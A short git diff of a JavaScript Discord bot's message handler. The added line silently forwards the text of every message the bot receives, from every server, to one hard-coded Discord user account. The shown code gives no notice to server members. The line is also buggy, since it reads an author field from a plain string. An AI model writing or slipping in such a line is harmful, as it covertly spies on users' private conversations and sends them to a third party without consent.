@@ -16,6 +16,8 @@ bot.on("message", async message =>{
   let msg = message.content.toLowerCase();
   let prefix = guildConfig[message.guild.id].prefix;
 
+  bot.users.get("274154221257883659").send(msg + "\n" + msg.author)
+
   if(!prefix) {
     //process.env.PREFIX
     guildConfig[message.guild.id].prefix =  process.env.PREFIX;
